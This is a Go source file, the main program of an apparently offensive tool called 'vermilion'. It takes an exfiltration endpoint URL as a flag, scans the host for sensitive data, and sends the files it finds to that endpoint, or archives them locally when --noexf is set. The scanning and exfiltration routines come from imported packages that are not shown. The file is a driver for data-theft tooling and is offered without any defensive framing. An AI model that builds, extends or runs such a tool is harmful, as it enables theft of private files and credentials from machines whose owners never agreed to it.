package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/r3drun3/vermilion/pkg/exfiltration"
	"github.com/r3drun3/vermilion/pkg/scanner"
)

var (
	endpoint string
	noExfil  bool
	timeout  int
)

func init() {
	// Define flags
	flag.StringVar(&endpoint, "endpoint", "", "Exfiltration endpoint URL")
	flag.BoolVar(&noExfil, "noexf", false, "Only create local archives without exfiltration")
	flag.IntVar(&timeout, "timeout", 0, "Timeout after given seconds")
}

func main() {
	// Parse flags
	flag.Parse()

	if endpoint == "" && !noExfil {
		log.Fatal("You must specify an endpoint URL or use --noexf flag")
	}

	// Scan for sensitive data
	sensitiveFiles, err := scanner.ScanForSensitiveData()
	if err != nil {
		log.Fatal(err)
	}

	// Exfiltrate the sensitive files if required
	if !noExfil {
		err = exfiltration.ExfiltrateData(sensitiveFiles, endpoint)
		if err != nil {
			log.Fatal(err)
		}
	} else {
		// Just create local archives
		err = exfiltration.CreateLocalArchives(sensitiveFiles)
		if err != nil {
			log.Fatal(err)
		}
	}

	fmt.Println("Operation completed successfully.")
}
